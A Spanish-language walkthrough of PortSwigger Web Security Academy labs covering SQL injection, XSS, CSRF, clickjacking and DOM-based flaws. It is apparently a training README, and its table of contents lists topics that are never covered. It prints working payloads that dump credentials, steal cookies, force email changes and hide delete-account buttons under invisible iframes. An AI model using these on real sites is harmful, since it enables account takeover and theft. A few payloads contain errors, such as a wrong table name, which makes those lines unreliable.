# LABS-Ciberseguridad

## Tabla de contenidos

1. [SQL Injection](#sql-injection)
2. [Cross-site scripting](#cross-site-scripting)
3. [Cross-site request forgery (CSRF)](<#cross-site-request-forgery-(csrf)>)
4. [Clickjacking](#clickjacking)
5. [DOM-based vulnerabilities](#dom-based-vulnerabilities)
6. [Cross-origin resource sharing (CORS)](<#cross-origin-resource sharing-(cors)>)
7. [XML external entity (XXE) injection](<#xml-external-entity-(xxe)-injection>)
8. [Server-side request forgery (SSRF)](<#server-side request-forgery-(ssrf)>)
9. [HTTP request smuggling](#http-request-smuggling)
10. [OS command injection](#os-command-injection)
11. [Server-side template injection](#server-side-template-injection)
12. [Directory traversal](#directory-traversal)
13. [Access control vulnerabilities](#access-control-vulnerabilities)
14. [Authentication](#authentication)
15. [WebSockets](#webSockets)
16. [Insecure deserialization](#insecure-deserialization)
17. [Information disclosure](#information-disclosure)
18. [Business logic vulnerabilities](#business-logic-vulnerabilities)
19. [HTTP Host header attacks](#http-host-header-attacks)

---

## [SQL Injection](https://portswigger.net/web-security/sql-injection)

### [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Cuando el usuario selecciona una categoría de productos en el sitio objetivo, se ejecuta la siguiente consulta SQL en el servidor (tomando como ejemplo la categoría Gifts):

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Como el nombre de la categoría que se envía en la request no es sanitizado antes de incluirse en la consulta, esto permite que un atacante la manipule y ejecute una inyección SQL. Para resolver el laboratorio se debe hacer lo siguiente:

1. Seleccionar una categoría en el sitio vulnerable y examinar la request interceptada en Burp Suite.
2. En la sentencia GET, modificar el parámetro `category` para que devuelva todos los registros de la tabla. Esto se puede lograr colocando una comilla simple para cerrar el string luego de `Accesories` (permitiendo insertar código SQL a continuación) y con una operación `OR 1=1`, lo que devuelve siempre `true`. Finalmente, se agrega el operador `--`, que comenta el resto de la consulta que está en el servidor. La petición debería quedar de la siguiente forma:

```
GET /filter?category=Accesories'OR+1=1-- HTTP/1.1
...
```

3. Por último, se envía la request, y el laboratorio estará resuelto.

### [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Cuando el usuario intenta iniciar sesión en el sitio objetivo, suponiendo que las credenciales utilizadas son `usuario` y `contraseña`, se ejecuta la siguiente consulta:

```
SELECT * FROM users WHERE username = 'usuario' AND password = 'contraseña'
```

Si no se sanitiza el parámetro del usuario, se puede iniciar sesión con cualquier cuenta mediante una inyección SQL. Para resolver el laboratorio se debe:

1. Acceder a la página de Login del sitio vulnerable, e intentar iniciar sesión con valores de usuario y contraseña arbitrarios.
2. En la request interceptada, en la última línea, donde se encuentra el token CSRF, se modifica el valor del parámetro `username` por `administrator'--`. Esto evita que se compruebe la contraseña, permitiendo iniciar sesión como dicho usuario. La petición debería quedar de la siguiente forma:

```
...
csrf=[token_csrf]&username=administrator'--&password=ramdom_characters
```

### [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Cuando una aplicación es vulnerable a una inyección SQL y los resultados de la consulta se envían en la response, se puede usar el comando `UNION` para recuperar datos de varias tablas, usando varias consultas. Para esto se deben cumplir dos condiciones: que las consultas devuelvan el mismo número de columnas, y que los tipos de datos en cada columna sean compatibles entre las consultas individuales.

Para determinar el número de columnas que devuelve una consulta, se puede inyectar `' UNION SELECT NULL--`, concatenando con varios `NULL` hasta que el servidor no devuelva ningún error, indicando que se obtuvo el número correcto de columnas.

1. Seleccionar una categoría en el sitio vulnerable.
2. En la request interceptada, editar el valor del parámetro `category` para que contenga el siguiente valor:

```
category=Accesories'+UNION+SELECT+NULL--
```

3. Como la consulta original no devuelve una columna, el servidor devuelve un código de error 500. Se debe concatenar otro `NULL`.

```
category=Accesories'+UNION+SELECT+NULL,NULL--
```

4. Nuevamente volvió a dar error, entonces se debe volver a concatenar otro `NULL` hasta que no haya más error.
5. Finalmente con 3 `NULL` no devolvió ningún error, lo que significa que la consulta original devuelve 3 columnas.

### [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Normalmente, los datos interesantes obtenidos mediante una inyección SQL son strings, porlo que, una vez averiguado cuántas columnas devuelve, se debe evaluar cuáles de ellas contienen datos de tipo string. Esto se puede lograr enviando las siguientes cargas (suponiendo que la consulta devuelve 3 columnas):

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a',--
```

Cuando una response no devuelva error, quiere decir que la columna que contiene texto está dada por la posición del string de prueba `'a'` (que puede ser cualquier string). Para resolver este laboratorio se debe:

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. Averiguar cuántas columnas devuelve la consulta original, tal como se vio en el laboratorio anterior (en este caso devuelve 3).
3. Ahora se debe averiguar cuál de esas columnas es de tipo `VARCHAR`. Para eso, se debe reemplazar el primer `NULL` por el string aleatorio brindado por el laboratorio (en mi caso fue `'xw5KZ4'`). La consulta debería quedar así:

```
GET /filter?category=Accesories' UNION SELECT 'xw5KZ4',NULL,NULL-- HTTP/1.1
...
```

4. Como dio error 500, se tiene que reemplazar el siguiente NULL, y así hasta dar con el correcto.
5. Al segundo intento no dio problemas, por lo tanto, la segunda columna contiene datos de tipo `VARCHAR`.

### [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Una vez que ya determiné el número de columnas devuelto por la consulta original, cuáles de ellas son de tipo string, y qué tablas y columnas contienen la información deseada, se pueden obtener los datos inyectando un código similar al siguiente:

```
' UNION SELECT username, password FROM users--
```

Suponiendo que la consulta devuelve dos columnas con strings, y que existe una tabla `users` con dos columnas `username` y `password`. Para resolver este laboratorio se debe:

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. En la request interceptada, primero averiguar cuántas columnas devuelve la consulta, y cuáles son del tipo `VARCHAR`. En este caso devuelve dos columnas, y ambas son de ese tipo (que sorpresa).
3. Ahora, para obtener todos los nombres de usuarios y contraseñas se inyecta la carga `'+UNION+SELECT+username,+password+FROM+users--`. La request queda con el siguiente formato:

```
GET /filter?category=Accesories'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1
...
```

4. Finalmente, entre los productos mostrados en el sitio, estarán los nombres de usuarios con sus respectivas contraseñas.

### [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

En caso de que la consulta original devuelva una sola columna, se pueden concatenar los datos recuperados, incluyendo un separador para distinguir los distintos valores. Por ejemplo:

```
' UNION SELECT username || '~' || password FROM users--
```

El operador para concatenar varía según el motor de bases de datos que utiliza el servidor. Para resolver este laboratorio se debe:

1. Seleccionar una categoría de productos del sitio vulnerable.
2. En la request interceptada, averiguar cuántas columnas devuelve la consulta y cuál es del tipo `VARCHAR`. En este caso, la consulta original devuelve dos columnas, pero sólo la segunda es del tipo `VARCHAR`.
3. Ahora, para recuperar los usuarios y contraseñas se deben concatenar ambos campos en una sola columna con el payload `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`.
4. Entre los productos mostrados por el sitio se listan los usuarios y contraseñas. Sólo resta iniciar sesión como administrator y listo.

### [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

En caso de suponer que el sitio vulnerable usa un motor de bases de datos Oracle, se puede usar un ataque UNION para obtener la versión del motor utilizado.

Se debe tener en cuenta que en Oracle todas las consultas `SELECT` deben incluir un `FROM`, aunque no se extraigan datos de ninguna tabla. Para eso se puede utilizar la tabla `DUAL`. Para resolver este laboratorio se debe:

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. En la request interceptada, averiguar cuántas columnas devuelve la consulta original, y cuáles de esas contienen strings, tal como se hizo en los laboratorios anteriores (en este caso devuelve dos columnas con strings).
3. En Oracle se puede obtener la versión del motor con `SELECT BANNER FROM v$version`. Adaptando al escenario del laboratorio, el payload tendría esta forma:

```
category=Accesories'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

4. Al final, se muestra el resultado entre los productos del sitio.

### [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

En el caso de una base de datos Microsoft SQL Server o MySQL, la técnica es prácticamente la misma que en el caso anterior, salvo que la consulta para obtener la versión es simplemente `SELECT @@version`.

Como el laboratorio usa MySQL, para comentar se utiliza `#`, ya que para usar `--` se debe agregar un espacio al final.

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. En la request interceptada, averiguar cuántas columnas devuelve la consulta original, y cuáles de esas contienen strings, tal como se hizo en los laboratorios anteriores (en este caso devuelve dos columnas con strings).
3. El payload para obtener la versión es:

```
category=Accesories'+UNION+SELECT+@@version,+NULL#
```

4. Al final, se muestra el resultado entre los productos del sitio.

### [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

La gran mayoría de los DBMS (menos Oracle) tienen una vista llamada `information_schema`, que brinda información acerca de la base de datos, como los nombres de las tablas y columnas. La tabla `information_schema.tables` contiene los nombres de todas las tablas, e `information_schema.columns` los nombres de todas las columnas de todas las tablas. Para resolver el laboratorio se debe:

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. En la request interceptada, averiguar cuántas columnas devuelve la consulta original, y cuáles son `VARCHAR` (otra vez devuelve dos columnas de ese tipo).
3. Para obtener los nombres de las tablas, usar el payload `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` en el parámetro `category`.
4. Luego, se deben obtener los nombres de las columnas de las tablas que aparentan almacenar usuarios y contraseñas, usando el payload `'+UNION+SELECT+column_name,+NULL+FROM information_schema.columns+WHERE+table_name+=+'nombre_de_la_tabla'--`.
5. Después de probar con varias tablas, vi que `users_sdismv` es la que almacena las credenciales. Las columnas `username_rhprkn` y `password_wwnrwq` guardan los datos buscados.
6. Sólo resta usar `'+UNION+SELECT+username_rhprkn,+password_wwnrwq+FROM+username_rhprkn--` e iniciar sesión con las credenciales de `administrator`.

### [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

En el caso de Oracle la operatoria varía ligeramente. Los nombres de las tablas se encuentran en `all_tables`, y los de las columnas en `all_tab_columns`. Para resolver el laboratorio se debe:

1. Seleccionar una categoría de productos en el sitio vulnerable.
2. En la request interceptada, averiguar cuántas columnas devuelve la consulta original, y cuáles son strings (otra vez devuelve dos columnas de ese tipo).
3. Para obtener los nombres de las tablas, usar el payload `'+UNION+SELECT+table_name,NULL+FROM+all_tables--` en el parámetro `category`.
4. Luego, se deben obtener los nombres de las columnas de las tablas que aparentan almacenar usuarios y contraseñas, usando el payload `'+UNION+SELECT+column_name,+NULL+FROM all_tab_columns+WHERE+table_name+=+'nombre_de_la_tabla'--`.
5. Después de probar con varias tablas, vi que `USERS_TJPWIB` es la que almacena las credenciales. Las columnas `USERNAME_KJFHXT` y `PASSWORD_HAQQFY` guardan los datos buscados.
6. Sólo resta usar `'+UNION+SELECT+USERNAME_KJFHXT,+PASSWORD_HAQQFY+FROM+USERS_TJPWIB--` e iniciar sesión con las credenciales de `administrator`.

### [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Una blind SQL injection ("inyección SQL a ciegas") se da cuando una aplicación es vulnerable a una inyección SQL, pero la respuesta HTTP no contiene la respuesta de una consulta ni errores de la DB.

En este laboratorio, el sitio vulnerable usa una cookie de rastreo para realizar analítica. Al procesar una request, se ejecuta una consulta SQL para ver si el valor de la cookie corresponde a un usuario existente. En la response no se devuelve ningún resultado o error, pero el sitio muestra un mensaje de "Welcome back" si la consulta devuelve algún resultado, indicando que es un usuario conocido.

Para resolver este laboratorio se debe:

1. Visitar la página principal del sitio vulnerable.
2. Usando Burp, comprobar si existe un usuario `administrator` en la tabla `users`. Para esto, al final de la request, al valor del parámetro `TrackingId` agregar el payload `'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--`.
3. Como apareció el mensaje de Welcome back, quiere decir que ese usuario existe.
4. Usando Burp Repeater, averiguar cuántos caracteres tiene la contraseña con el payload

`'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)=1--`

5. Esto se debe hacer hasta que aparezca el mensaje Welcome back. Para ahorrar tiempo y esfuerzo, se puede hacer una búsqueda binaria o usar Burp intruder. En este caso, la contraseña tiene 20 caracteres.
6. Usando Burp Intruder, averiguar uno por uno cuáles son los caracteres que conforman la contraseña. Para esto se usa el payload `'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--` y se configura Intruder de esta forma:
   - En la pestaña Positions, hacer clic en Clear §.
   - Seleccionar la `a` y hacer clic en Add §.
   - En la pestaña Payloads, seleccionar Simple list, y debajo de Payload Options agregar todas las letras en minúscula y números (el laboratorio asume que la contraseña sólo contiene esos caracteres).
   - En la pestaña Options, en la sección Grep - Match eliminar todas las entradas de la lista y agregar "Welcome back". Esto resalta las responses que contienen dicha frase.
7. Iniciar el ataque y esperar a que aparezca un resultado que contenga Welcome back. El caracter que esté en la columna Payload es el que se encuentra en la contraseña.
8. Ahora repetir el último paso para cada una de las 19 posiciones restantes, reemplazando el primer 1 por la posición correspondiente. Esto se automatizar usando un ataque del tipo Cluster bomb. En mi caso no funcionó, ya que luego de enviar 200 de 720 request, el laboratorio se reinició y todas empezaron a devolver error 504. Así que tuve que hacer manualmente.
9. Una vez que se tenga la contraseña completa, iniciar sesión como administrator y listo.

### [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

Puede darse el caso de que la aplicación no varíe su comportamiento si la consulta arroja resultados o no. Pero si un error no tratado de la base de la datos (como una división por cero) cambia la response (por ejemplo, devolviendo un error), se puede aprovechar para utilizar una inyección SQL.

En este laboratorio no hay mensaje de "Welcome back", pero la response devuelve un error 500 Internal Server Error si falla la ejecución de la consulta. Para resolverlo se debe:

1. Visitar la página principal del sitio vulnerable.
2. Usando Burp, comprobar si existe un usuario `administrator` en la tabla `users`. Para esto, al final de la request, al valor del parámetro `TrackingId` agregar el payload `'+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--`.
3. Como la consulta devuelve un error 500, quiere decir que ese usuario existe.
4. Usando Burp Intruder, averiguar cuántos caracteres tiene la contraseña con el payload

`'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--`

5. Se selecciona el primer 1, se hace clic en Add §, y en Payload Options se agregan a la lista los números del 1 al 30. En este caso, la contraseña tiene 20 caracteres.
6. Usando Burp Intruder, averiguar uno por uno cuáles son los caracteres que conforman la contraseña. Para esto se usa el payload `'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,1,1)='a')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--` y se configura de la misma forma que el laboratorio anterior, pero en Grep - Match se agrega "Internal Server Error".
7. Iniciar el ataque y esperar a que aparezca un resultado que contenga dicho error. El caracter que esté en la columna Payload es el que se encuentra en la contraseña.
8. Ahora repetir el último paso para cada una de las 19 posiciones restantes, igual que en el laboratorio anterior.
9. Una vez que se tenga la contraseña completa, iniciar sesión como administrator y listo.

---

## [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

### [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

El sitio objetivo tiene una vulnerabilidad en la función de búsqueda, no se realiza un control sobre los términos introducidos por el usuario, permitiendo que este ingrese texto arbitrario (incluyendo código malicioso). Además, el sitio retorna en la respuesta del mensaje HTTP enviado los términos de búsqueda introducidos por el usuario, lo que da lugar a un ataque del tipo "Reflected XSS".

Para resolver este lab, simplemente se escribe un script en el cuadro de búsqueda con el código malicioso a ejecutar (un `alert` en el ejemplo):

```html
<script>
  alert('Hello World!');
</script>
```

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

### [DOM XSS in innerHTML sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

```html
<!-- In query text input -->
<img src="1" onerror="alert(document.domain)" />
```

### [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

```html
&apos;&lt;img src="1" on&#101;rror=alert; throw document.cookie&lt;/img&gt;&apos;
```

### [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

El sitio objetivo tiene una vulnerabilidad en la sección de comentarios, que permite cargar código arbitrario que se ejecuta en el momento en que cualquier usuario ingresa a la publicación afectada.

Para resolver este lab, se ingresa como comentario de una públicación un script que se ejecutará cuando la víctima ingrese a la publicación, y generará un nuevo comentario con las cookies robadas a la víctima.

Por último, se debe cargar las cookies robadas en el navegador del atacante e ingresar al sitio objetivo para "ingresar" con las credenciales robadas.

```html
<script>
  document.addEventListener('DOMContentLoaded', function () {
    let cookie = document.cookie;
    let comment = document.getElementsByName('comment')[0];
    comment.value = cookie;
    let name = document.getElementsByName('name')[0];
    name.value = '1337';
    let email = document.getElementsByName('email')[0];
    email.value = '1337@h4xx0r.com';
    let website = document.getElementsByName('website')[0];
    website.value = 'https://mywebsite.com';
    let form = document.getElementsByTagName('form')[0];
    form.submit();
  });
</script>
```

### [Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

El sitio objetivo tiene una vulnerabilidad en la sección de comentarios, que permite cargar código arbitrario que y ejecutarlo en el momento en que cualquier usuario ingresa a la publicación afectada. Además, en cada publicación hay un formulario para dejar comentarios que contiene un token CSRF válido, el cual puede ser utilizado para atravesar el control de CSRF.

Para resolver este lab, se escribe un Script que envía un mensaje HTTP, a la ubicación /email/change-email del sitio, con el método POST. En el cuerpo del mensaje, se incorpora el nuevo email y el token CSRF obtenido del formulario de comentarios.

```html
<form action="/email/change-email" method="POST">
  <input type="hidden" name="email" value="plz@stap.com" />
  <input id="changeMe" required="" type="hidden" name="csrf" value="changeMe" />
</form>
<script>
  document.addEventListener('DOMContentLoaded', (event) => {
    let csrf = document.getElementById('changeMe');
    let origCsrf = document.forms[1].getElementsByTagName('input')[0];
    csrf.value = origCsrf.value;
    document.forms[0].submit();
  });
</script>
```

### [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

```javascript
</script><script>alert(1)</script>
```

### [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

```javascript
'; alert(1)//
```

### [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

```javascript
\'; alert(1)//
```

### [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

```javascript
<!-- In Query text input -->
${alert(1)}
```

### [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

```javascript
" autofocus onfocus="alert(document.domain)"
```

### [Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

```javascript
<svg width="120" height="120" viewBox="0 0 120 120" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <a>
    <text x="10" y="25" width="100" height="100">
      Hello
    </text>
    <animate attributeName="href" values="javascript://%0aalert(1)" />
  </a>
</svg>
```

### [Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

```javascript
<!-- In Website section -->
javascript:alert("1337")
```

### [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

```javascript
<!-- In website section -->
&apos;-alert(document.domain)-&apos;
```

---

## [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)

### [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

#### Solución:

```
<form method="POST" action="https://aced1f971f5a2e0d80c321bf00e30015.web-security-academy.net/email/change-email">
     <input type="hidden" name="email" value="asd@mail.com">
<input type="hidden" name="csrf" value="OQJBSyA28bY0ntWPuDdNcDhU0xN4zavJ">
</form>
<script>
      document.forms[0].submit();
</script>
```

---

## [Clickjacking](https://portswigger.net/web-security/clickjacking)

### [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

Este laboratorio contiene un botón para eliminar la cuenta el cual está protegido por un token CSRF. La intención es hacer que un usuario haga click en un iframe con opacidad baja para que elimine su cuenta.

Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Account Actions, y tomando esta url, la ponemos en el src del siguiente iframe.

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 370px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://ac411f041eabd7098042860e00170056.web-security-academy.net/account"></iframe>
```

### [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario rellenando previamente un formulario utilizando parámetros URL e intentar engañarlo para que haga click en un botón "Update Email" sin que el mismo sepa.

Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Change Email, y tomando esta url, la ponemos en el src del siguiente iframe, seguido del parámetro email.

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 560px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"
></iframe>
```

### [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

Este laboratorio está protegido por un frame buster que evita que se ejecute un frame en el sitio web. El objetivo es evitar el frame buster y realizar un ataque clickjacking que ejecute un Update Email.

La solución a este laboratorio es la misma que el anterior, pero agregando el atributo sandbox="allow-forms" en el tag del iframe.

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 510px;
    left: 80px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  sandbox="allow-forms"
  src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"
></iframe>
```

### [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

Este laboratorio contiene una vulnerabilidad XSS que se activa con un click. El objetivo es construir un ataque de clickjacking para ejecutar un XSS payload que imprime un alert con el contenido de document.cookie.

Al ir a la sección Submit Feedback y enviar un formulario, vemos que se imprime el nombre, por lo que se puede buscar el XSS mediante el envío de dicho parámetro como se muestra a continuación:

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 620px;
    left: 80px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"
></iframe>
```

### [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

En este laboratorio se deben tener dos elementos en los que el usuario deberá hacer click uno antes que el otro, debido a que la intención es eliminar la cuenta del mismo, para lo cual deberá hacer un click primeramente para iniciar la acción de eliminar la cuenta, y luego otro click de confirmación para que la cuenta sea eliminada.

Para resolver este laboratorio, vamos a la sección Account Actions, copiamos la url y la pegamos en el src del siguiente iframe:

```html
<style>
  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  .first,
  .next {
    position: absolute;
    top: 330px;
    left: 50px;
    z-index: 1;
  }
  .next {
    left: 200px;
  }
</style>
<div class="first">Click me first</div>
<div class="next">Click me next</div>
<iframe src="https://ac391f251e65efb180df32b2007d0066.web-security-academy.net/account"></iframe>
```

---

## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)

### [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

En este laboratorio el sitio vulnerable tiene un event listener `message` con el siguiente código, el cual carga todo el contenido del mensaje en un `div` con id `ads`:

```
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Para resolver el laboratorio, se debe cargar en el exploit server un `iframe`, que al ser cargado envía un web message a la home del sitio vulnerable. El event listener inserta el contenido (es decir, una imagen) en `ads`. Como la imagen tiene un `src` inválido, se ejecuta el handler `onerror`, que muestra las cookies.

```
<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
```

### [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

La home del sitio vulnerable tiene el siguiente event listener, que evalúa si en cualquier parte (no sólo al comienzo) del mensaje está el substring `"http:"` o `"https:"`. En caso afirmativo, lo guarda en `location.href`

```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

Para resolver el laboratorio se carga en el exploit server un `iframe` que envíe un mensaje que alerte las cookies mediante Javascript, pero al final del mismo se agrega un comentario y la palabra `http:`. Esto hará que se cumpla la condición del event listener, y al mismo tiempo no dará ningún error de sintaxis.

```
<iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
```

### [DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

El sitio vulnerable tiene un event listener que espera recibir un string que es parseado con `JSON.parse()`. En el objeto parseado se espera que haya una propiedad `type` que es evaluada en un `switch`, y en caso de que tenga el valor `'load-channel'` se cambia el `src` del `iframe` al valor de la propiedad `url` del mismo objeto.

```
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```

Para resolver el laboratorio se carga en el exploit server un `iframe`, donde el contenido del mensaje sea un string que pueda ser parseado, y que tenga 2 atributos: `type` (cuyo valor es `"load-channel"`) y `url` (cuyo valor es el código que se quiere inyectar).

```
<iframe src=https://id-del-laboratorio.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
```

### [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

Al ingresar en un posteo del sitio vulnerable, al final de todo hay un link que debería redirigir a la home. En caso de que `returnUrl` tenga un valor _truthy_, se le asignará a `location.href` el valor en la posición 1. Si no, se le asignará `"/"`.

```
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"">Back to Blog</a>
```

Para resolver el laboratorio, se debe armar una URL similar a la del posteo, pero que al final incluya otro query parameter `url`, cuyo valor sea la URL del exploit server del laboratorio.

```
https://id-del-laboratorio.web-security-academy.net/post?postId=4&url=https://id-del-exploit-server.web-security-academy.net/
```

### [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

El sitio vulnerable usa una cookie llamada `lastViewedProduct`, cuyo valor es la URL del último producto visitado, y se utiliza en un link dentro de la tienda.

Para resolver el laboratorio, se debe cargar un `iframe` en el exploit server, cuyo source original es igual a la URL de uno de los productos, a menos que se agregue un payload Javascript al final. Cuando el `iframe` carga por primera vez, el navegador abre temporalmente la URL maliciosa, que después se guarda como el valor de dicha cookie. El event handler de `onload` redirige inmediatamente a la home, pero mientras la cookie siga estando envenenada, se va a ejecutar la payload cada vez que se visite la home.

```
<iframe src="https://id-del-laboratorio.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://id-del-laboratorio.web-security-academy.net';window.x=1;">
```

